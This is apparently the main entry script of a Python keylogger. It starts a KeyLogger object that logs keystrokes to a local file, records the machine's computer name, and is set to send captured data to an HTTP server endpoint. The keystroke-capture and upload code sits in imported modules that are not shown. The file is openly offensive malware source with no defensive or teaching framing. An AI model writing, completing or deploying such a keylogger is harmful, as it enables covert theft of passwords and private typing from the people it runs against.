from key_handler import KeyLogger
from system_info import get_system_info

if __name__ == "__main__":
    SERVER_URL = "http://127.0.0.1:5000/api/data"
    LOG_FILE = "a.txt"

    keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)

    system_info = get_system_info()
    system_info_line = f"[System Info] Computer Name: {system_info['computer_name']}\n"
    keylogger.logger.write_to_file(system_info_line)
    print(system_info_line)

    keylogger.run()
